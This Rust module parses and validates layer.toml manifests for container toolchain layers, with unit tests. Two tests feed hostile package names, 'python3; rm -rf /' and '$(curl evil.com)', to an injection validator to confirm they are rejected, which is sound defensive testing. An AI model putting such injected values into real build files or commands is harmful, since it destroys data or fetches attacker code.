//! Layer manifest parsing
//!
//! Each layer has a `layer.toml` manifest describing its metadata,
//! environment variables, cache paths, and optional user-level install
//! instructions for bootstrap-based tool installation.

use crate::error::{MinoError, MinoResult};
use serde::{Deserialize, Serialize};
use std::path::Path;

/// Parsed layer manifest from layer.toml
#[derive(Debug, Clone, Deserialize)]
pub struct LayerManifest {
    /// Layer metadata
    pub layer: LayerMeta,

    /// Environment variables to set
    #[serde(default)]
    pub env: LayerEnv,

    /// Cache configuration
    #[serde(default)]
    pub cache: LayerCache,

    /// System packages requiring root (dnf install)
    #[serde(default)]
    pub root_install: RootInstall,

    /// User-level tool installs (run via bootstrap, not compose)
    #[serde(default)]
    pub user_install: UserInstall,
}

/// Layer metadata section
#[derive(Debug, Clone, Deserialize)]
pub struct LayerMeta {
    /// Layer name (must match directory name)
    pub name: String,

    /// Human-readable description
    pub description: String,

    /// Schema version for forward compatibility
    pub version: String,
}

/// Environment variables section
///
/// Flat keys are env vars (e.g., `CARGO_HOME = "/cache/cargo"`).
/// The `path_prepend` sub-table lists directories to prepend to PATH.
#[derive(Debug, Clone, Default, Deserialize)]
pub struct LayerEnv {
    /// Directories to prepend to PATH
    #[serde(default)]
    pub path_prepend: PathPrepend,

    /// Flat env vars — collected by flattening the TOML table
    /// and excluding known sub-tables (path_prepend)
    #[serde(flatten)]
    pub vars: std::collections::HashMap<String, toml::Value>,
}

/// PATH prepend configuration
#[derive(Debug, Clone, Default, Deserialize)]
pub struct PathPrepend {
    /// Directories to prepend to PATH
    #[serde(default)]
    pub dirs: Vec<String>,
}

/// Cache configuration section
#[derive(Debug, Clone, Default, Deserialize)]
pub struct LayerCache {
    /// Paths that should be persisted in cache volumes
    #[serde(default)]
    pub paths: Vec<String>,
}

/// System packages requiring root installation (via dnf)
#[derive(Debug, Clone, Default, Deserialize)]
pub struct RootInstall {
    /// Package names to install via `dnf install`
    #[serde(default)]
    pub packages: Vec<String>,
}

/// Allowed characters in dnf package names: alphanumeric, hyphens, underscores, dots, plus signs
fn is_valid_package_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '+'
}

impl RootInstall {
    /// Validate that package names contain only safe characters.
    ///
    /// Prevents command injection when package names are interpolated
    /// into `RUN dnf install` in generated Dockerfiles.
    pub fn validate(&self) -> MinoResult<()> {
        for pkg in &self.packages {
            if pkg.is_empty() {
                return Err(MinoError::ConfigInvalid {
                    path: "layer.toml".into(),
                    reason: "root_install.packages contains an empty package name".to_string(),
                });
            }
            if !pkg.chars().all(is_valid_package_char) {
                return Err(MinoError::ConfigInvalid {
                    path: "layer.toml".into(),
                    reason: format!(
                        "invalid package name '{}': must contain only alphanumeric characters, hyphens, underscores, dots, or plus signs",
                        pkg
                    ),
                });
            }
        }
        Ok(())
    }
}

/// Valid runtime manager names for user-level installs
const VALID_RUNTIMES: &[&str] = &["nvm", "rustup", "uv"];

/// User-level tool installation instructions.
///
/// These are serialized as JSON and passed to the bootstrap script
/// via the `MINO_LAYER_MANIFEST` env var. The bootstrap script
/// reads the manifest and installs tools into the persistent home volume.
#[derive(Debug, Clone, Default, Deserialize, Serialize)]
pub struct UserInstall {
    /// Runtime manager: "nvm", "rustup", "uv"
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub runtime: Option<String>,

    /// Runtime version to install (e.g., "22", "stable")
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub runtime_version: Option<String>,

    /// npm global packages to install (for nvm runtime)
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub npm_globals: Vec<String>,

    /// Cargo tools to install via binstall (for rustup runtime)
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub cargo_tools: Vec<String>,

    /// uv tools to install (for uv runtime)
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub uv_tools: Vec<String>,
}

impl UserInstall {
    /// Returns true if there are no user-level install instructions.
    pub fn is_empty(&self) -> bool {
        self.runtime.is_none()
            && self.npm_globals.is_empty()
            && self.cargo_tools.is_empty()
            && self.uv_tools.is_empty()
    }

    /// Validate runtime value against known runtimes.
    pub fn validate(&self) -> MinoResult<()> {
        if let Some(ref rt) = self.runtime {
            if !VALID_RUNTIMES.contains(&rt.as_str()) {
                return Err(MinoError::ConfigInvalid {
                    path: "layer.toml".into(),
                    reason: format!(
                        "unknown runtime '{}', valid options: {:?}",
                        rt, VALID_RUNTIMES
                    ),
                });
            }
        }
        Ok(())
    }
}

/// Entry in the serialized layer manifest JSON array.
///
/// Wraps `UserInstall` with the layer name so the bootstrap script
/// can write per-layer step markers.
#[derive(Debug, Serialize)]
pub struct LayerManifestEntry {
    /// Layer name (for per-step markers in bootstrap)
    pub name: String,

    /// User-level install instructions
    #[serde(flatten)]
    pub install: UserInstall,
}

impl LayerManifest {
    /// Parse a manifest from a TOML file on disk
    pub async fn from_file(path: &Path) -> MinoResult<Self> {
        let content = tokio::fs::read_to_string(path)
            .await
            .map_err(|e| MinoError::io(format!("reading layer manifest {}", path.display()), e))?;
        Self::parse(&content)
    }

    /// Parse a manifest from a TOML string (for embedded built-in layers)
    pub fn parse(content: &str) -> MinoResult<Self> {
        toml::from_str(content).map_err(|e| MinoError::ConfigInvalid {
            path: "layer.toml".into(),
            reason: e.to_string(),
        })
    }

    /// Extract flat environment variables (excludes path_prepend)
    pub fn env_vars(&self) -> std::collections::HashMap<String, String> {
        self.env
            .vars
            .iter()
            .filter_map(|(k, v)| {
                // Only include string values, skip sub-tables
                v.as_str().map(|s| (k.clone(), s.to_string()))
            })
            .collect()
    }

    /// Get the full PATH prepend string (dirs joined with ":")
    pub fn path_prepend_str(&self) -> Option<String> {
        if self.env.path_prepend.dirs.is_empty() {
            None
        } else {
            Some(self.env.path_prepend.dirs.join(":"))
        }
    }

    /// Returns true if this layer has user-level install instructions.
    pub fn has_user_install(&self) -> bool {
        !self.user_install.is_empty()
    }

    /// Returns true if this layer requires root-level system packages.
    pub fn has_root_install(&self) -> bool {
        !self.root_install.packages.is_empty()
    }
}

/// Build a JSON manifest string from layers that have user_install sections.
///
/// Returns `None` if no layers have user_install content.
/// The JSON is an array of `LayerManifestEntry` objects for the bootstrap script.
pub fn build_layer_manifest(
    layers: &[crate::layer::resolve::ResolvedLayer],
) -> MinoResult<Option<String>> {
    let entries: Vec<LayerManifestEntry> = layers
        .iter()
        .filter(|l| l.manifest.has_user_install())
        .map(|l| LayerManifestEntry {
            name: l.manifest.layer.name.clone(),
            install: l.manifest.user_install.clone(),
        })
        .collect();

    if entries.is_empty() {
        return Ok(None);
    }

    let json = serde_json::to_string(&entries)?;
    Ok(Some(json))
}

#[cfg(test)]
mod tests {
    use super::*;

    const RUST_MANIFEST: &str = r#"
[layer]
name = "rust"
description = "Rust stable toolchain + cargo tools"
version = "2"

[env]
CARGO_HOME = "/home/developer/.cargo"
RUSTUP_HOME = "/home/developer/.rustup"
RUSTC_WRAPPER = "sccache"
SCCACHE_DIR = "/cache/sccache"

[env.path_prepend]
dirs = ["/home/developer/.cargo/bin"]

[cache]
paths = ["/cache/sccache"]

[user_install]
runtime = "rustup"
runtime_version = "stable"
cargo_tools = ["bacon", "sccache"]
"#;

    const TS_MANIFEST: &str = r#"
[layer]
name = "typescript"
description = "Node.js + pnpm + TypeScript toolchain"
version = "2"

[env]
PNPM_HOME = "/cache/pnpm"
npm_config_cache = "/cache/npm"
NODE_ENV = "development"

[env.path_prepend]
dirs = ["/cache/pnpm", "/home/developer/.npm-global/bin"]

[cache]
paths = ["/cache/pnpm", "/cache/npm"]

[user_install]
runtime = "nvm"
runtime_version = "22"
npm_globals = ["pnpm", "tsx"]
"#;

    #[test]
    fn parse_rust_manifest() {
        let manifest = LayerManifest::parse(RUST_MANIFEST).unwrap();
        assert_eq!(manifest.layer.name, "rust");
        assert_eq!(manifest.layer.version, "2");

        let vars = manifest.env_vars();
        assert_eq!(vars.get("CARGO_HOME").unwrap(), "/home/developer/.cargo");
        assert_eq!(vars.get("RUSTUP_HOME").unwrap(), "/home/developer/.rustup");
        assert_eq!(vars.get("RUSTC_WRAPPER").unwrap(), "sccache");
        assert_eq!(vars.get("SCCACHE_DIR").unwrap(), "/cache/sccache");

        assert_eq!(
            manifest.path_prepend_str(),
            Some("/home/developer/.cargo/bin".to_string())
        );
        assert_eq!(manifest.cache.paths, vec!["/cache/sccache"]);

        assert!(manifest.has_user_install());
        assert_eq!(manifest.user_install.runtime.as_deref(), Some("rustup"));
        assert_eq!(
            manifest.user_install.runtime_version.as_deref(),
            Some("stable")
        );
        assert_eq!(
            manifest.user_install.cargo_tools,
            vec!["bacon", "sccache"]
        );
    }

    #[test]
    fn parse_typescript_manifest() {
        let manifest = LayerManifest::parse(TS_MANIFEST).unwrap();
        assert_eq!(manifest.layer.name, "typescript");

        let vars = manifest.env_vars();
        assert_eq!(vars.get("PNPM_HOME").unwrap(), "/cache/pnpm");
        assert_eq!(vars.get("npm_config_cache").unwrap(), "/cache/npm");
        assert_eq!(vars.get("NODE_ENV").unwrap(), "development");

        assert_eq!(
            manifest.path_prepend_str(),
            Some("/cache/pnpm:/home/developer/.npm-global/bin".to_string())
        );

        assert!(manifest.has_user_install());
        assert_eq!(manifest.user_install.runtime.as_deref(), Some("nvm"));
        assert_eq!(
            manifest.user_install.runtime_version.as_deref(),
            Some("22")
        );
        assert_eq!(manifest.user_install.npm_globals, vec!["pnpm", "tsx"]);
    }

    #[test]
    fn missing_required_fields_errors() {
        let bad_toml = r#"
[layer]
name = "broken"
"#;
        let result = LayerManifest::parse(bad_toml);
        assert!(result.is_err());
    }

    #[test]
    fn empty_optional_fields() {
        let minimal = r#"
[layer]
name = "minimal"
description = "Minimal layer"
version = "1"
"#;
        let manifest = LayerManifest::parse(minimal).unwrap();
        assert!(manifest.env_vars().is_empty());
        assert!(manifest.path_prepend_str().is_none());
        assert!(manifest.cache.paths.is_empty());
        assert!(!manifest.has_user_install());
        assert!(!manifest.has_root_install());
    }

    #[test]
    fn parse_user_install_nvm() {
        let toml = r#"
[layer]
name = "typescript"
description = "TypeScript"
version = "2"

[user_install]
runtime = "nvm"
runtime_version = "22"
npm_globals = ["pnpm", "tsx", "typescript"]
"#;
        let manifest = LayerManifest::parse(toml).unwrap();
        assert!(manifest.has_user_install());
        assert_eq!(manifest.user_install.runtime.as_deref(), Some("nvm"));
        assert_eq!(manifest.user_install.runtime_version.as_deref(), Some("22"));
        assert_eq!(
            manifest.user_install.npm_globals,
            vec!["pnpm", "tsx", "typescript"]
        );
        assert!(manifest.user_install.cargo_tools.is_empty());
    }

    #[test]
    fn parse_user_install_rustup() {
        let toml = r#"
[layer]
name = "rust"
description = "Rust"
version = "2"

[user_install]
runtime = "rustup"
runtime_version = "stable"
cargo_tools = ["bacon", "sccache"]
"#;
        let manifest = LayerManifest::parse(toml).unwrap();
        assert!(manifest.has_user_install());
        assert_eq!(manifest.user_install.runtime.as_deref(), Some("rustup"));
        assert_eq!(manifest.user_install.cargo_tools, vec!["bacon", "sccache"]);
    }

    #[test]
    fn parse_user_install_uv() {
        let toml = r#"
[layer]
name = "python"
description = "Python"
version = "2"

[root_install]
packages = ["python3", "python3-devel"]

[user_install]
runtime = "uv"
uv_tools = ["ruff", "pytest"]
"#;
        let manifest = LayerManifest::parse(toml).unwrap();
        assert!(manifest.has_user_install());
        assert!(manifest.has_root_install());
        assert_eq!(
            manifest.root_install.packages,
            vec!["python3", "python3-devel"]
        );
        assert_eq!(manifest.user_install.runtime.as_deref(), Some("uv"));
        assert_eq!(manifest.user_install.uv_tools, vec!["ruff", "pytest"]);
    }

    #[test]
    fn user_install_validate_valid_runtimes() {
        for rt in &["nvm", "rustup", "uv"] {
            let install = UserInstall {
                runtime: Some(rt.to_string()),
                ..Default::default()
            };
            assert!(install.validate().is_ok());
        }
    }

    #[test]
    fn user_install_validate_invalid_runtime() {
        let install = UserInstall {
            runtime: Some("conda".to_string()),
            ..Default::default()
        };
        let err = install.validate().unwrap_err();
        assert!(err.to_string().contains("unknown runtime 'conda'"));
    }

    #[test]
    fn user_install_validate_none_runtime() {
        let install = UserInstall::default();
        assert!(install.validate().is_ok());
    }

    #[test]
    fn user_install_is_empty() {
        assert!(UserInstall::default().is_empty());

        let with_runtime = UserInstall {
            runtime: Some("nvm".to_string()),
            ..Default::default()
        };
        assert!(!with_runtime.is_empty());

        let with_globals = UserInstall {
            npm_globals: vec!["pnpm".to_string()],
            ..Default::default()
        };
        assert!(!with_globals.is_empty());
    }

    #[test]
    fn layer_manifest_entry_serializes_flat() {
        let entry = LayerManifestEntry {
            name: "typescript".to_string(),
            install: UserInstall {
                runtime: Some("nvm".to_string()),
                runtime_version: Some("22".to_string()),
                npm_globals: vec!["pnpm".to_string()],
                ..Default::default()
            },
        };
        let json = serde_json::to_string(&entry).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed["name"], "typescript");
        assert_eq!(parsed["runtime"], "nvm");
        assert_eq!(parsed["runtime_version"], "22");
        assert_eq!(parsed["npm_globals"][0], "pnpm");
        // Empty fields should be omitted
        assert!(parsed.get("cargo_tools").is_none());
        assert!(parsed.get("uv_tools").is_none());
    }

    // --- RootInstall validation tests ---

    #[test]
    fn root_install_validate_valid_packages() {
        let install = RootInstall {
            packages: vec![
                "python3".to_string(),
                "python3-devel".to_string(),
                "gcc-c++".to_string(),
                "libffi.x86_64".to_string(),
            ],
        };
        assert!(install.validate().is_ok());
    }

    #[test]
    fn root_install_validate_rejects_shell_injection() {
        let install = RootInstall {
            packages: vec!["python3; rm -rf /".to_string()],
        };
        let err = install.validate().unwrap_err();
        assert!(err.to_string().contains("invalid package name"));
    }

    #[test]
    fn root_install_validate_rejects_command_substitution() {
        let install = RootInstall {
            packages: vec!["$(curl evil.com)".to_string()],
        };
        assert!(install.validate().is_err());
    }

    #[test]
    fn root_install_validate_rejects_empty_name() {
        let install = RootInstall {
            packages: vec!["".to_string()],
        };
        let err = install.validate().unwrap_err();
        assert!(err.to_string().contains("empty package name"));
    }

    #[test]
    fn root_install_validate_empty_list() {
        let install = RootInstall::default();
        assert!(install.validate().is_ok());
    }

    // --- build_layer_manifest tests ---

    fn make_resolved_layer(
        manifest_toml: &str,
    ) -> crate::layer::resolve::ResolvedLayer {
        crate::layer::resolve::ResolvedLayer {
            manifest: LayerManifest::parse(manifest_toml).unwrap(),
            install_script: crate::layer::resolve::LayerScript::None,
            source: crate::layer::resolve::LayerSource::BuiltIn,
        }
    }

    #[test]
    fn build_layer_manifest_filters_non_user_install() {
        let layer_without = make_resolved_layer(
            r#"
[layer]
name = "minimal"
description = "No user install"
version = "1"
"#,
        );

        let result = build_layer_manifest(&[layer_without]).unwrap();
        assert!(result.is_none());
    }

    #[test]
    fn build_layer_manifest_includes_user_install_layers() {
        let layer_with = make_resolved_layer(
            r#"
[layer]
name = "typescript"
description = "TypeScript"
version = "2"

[user_install]
runtime = "nvm"
runtime_version = "22"
npm_globals = ["pnpm", "tsx"]
"#,
        );

        let json_str = build_layer_manifest(&[layer_with]).unwrap().unwrap();
        let parsed: Vec<serde_json::Value> = serde_json::from_str(&json_str).unwrap();

        assert_eq!(parsed.len(), 1);
        assert_eq!(parsed[0]["name"], "typescript");
        assert_eq!(parsed[0]["runtime"], "nvm");
        assert_eq!(parsed[0]["runtime_version"], "22");
        assert_eq!(parsed[0]["npm_globals"][0], "pnpm");
        assert_eq!(parsed[0]["npm_globals"][1], "tsx");
    }

    #[test]
    fn build_layer_manifest_multiple_layers_filters_correctly() {
        let layer_no_install = make_resolved_layer(
            r#"
[layer]
name = "minimal"
description = "No user install"
version = "1"
"#,
        );

        let layer_rust = make_resolved_layer(
            r#"
[layer]
name = "rust"
description = "Rust"
version = "2"

[user_install]
runtime = "rustup"
runtime_version = "stable"
cargo_tools = ["bacon"]
"#,
        );

        let layer_ts = make_resolved_layer(
            r#"
[layer]
name = "typescript"
description = "TypeScript"
version = "2"

[user_install]
runtime = "nvm"
npm_globals = ["pnpm"]
"#,
        );

        let json_str =
            build_layer_manifest(&[layer_no_install, layer_rust, layer_ts])
                .unwrap()
                .unwrap();
        let parsed: Vec<serde_json::Value> = serde_json::from_str(&json_str).unwrap();

        // Only the two layers with user_install should be included
        assert_eq!(parsed.len(), 2);
        assert_eq!(parsed[0]["name"], "rust");
        assert_eq!(parsed[0]["runtime"], "rustup");
        assert_eq!(parsed[0]["cargo_tools"][0], "bacon");
        assert_eq!(parsed[1]["name"], "typescript");
        assert_eq!(parsed[1]["runtime"], "nvm");
    }

    #[test]
    fn build_layer_manifest_omits_empty_fields() {
        let layer = make_resolved_layer(
            r#"
[layer]
name = "rust"
description = "Rust"
version = "2"

[user_install]
runtime = "rustup"
"#,
        );

        let json_str = build_layer_manifest(&[layer]).unwrap().unwrap();
        let parsed: Vec<serde_json::Value> = serde_json::from_str(&json_str).unwrap();

        assert_eq!(parsed[0]["name"], "rust");
        assert_eq!(parsed[0]["runtime"], "rustup");
        // Empty optional/list fields should be omitted (skip_serializing_if)
        assert!(parsed[0].get("runtime_version").is_none());
        assert!(parsed[0].get("npm_globals").is_none());
        assert!(parsed[0].get("cargo_tools").is_none());
        assert!(parsed[0].get("uv_tools").is_none());
    }

    #[test]
    fn build_layer_manifest_produces_valid_json() {
        let layer = make_resolved_layer(
            r#"
[layer]
name = "python"
description = "Python"
version = "2"

[user_install]
runtime = "uv"
uv_tools = ["ruff", "pytest"]
"#,
        );

        let json_str = build_layer_manifest(&[layer]).unwrap().unwrap();
        // Verify it parses as valid JSON array
        let parsed: serde_json::Value = serde_json::from_str(&json_str).unwrap();
        assert!(parsed.is_array());
    }
}
